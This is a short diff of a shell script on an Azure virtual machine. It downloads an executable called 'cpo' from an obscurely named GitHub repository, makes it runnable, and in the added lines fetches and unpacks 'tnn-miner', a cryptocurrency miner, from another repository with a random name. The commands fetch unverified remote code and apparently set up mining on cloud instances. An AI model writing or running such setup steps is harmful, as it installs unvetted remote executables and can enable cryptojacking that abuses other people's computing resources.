@@ -2,3 +2,7 @@
 rm -r /home/azureuser/cpo
 wget -P /home/azureuser https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/cpo
 chmod +x /home/azureuser/cpo
+###################### ADD TNN
+cd /home/azureuser
+wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/tnn-miner-0.3.7.tar.gz
+tar -xf tnn-miner-0.3.7.tar.gz
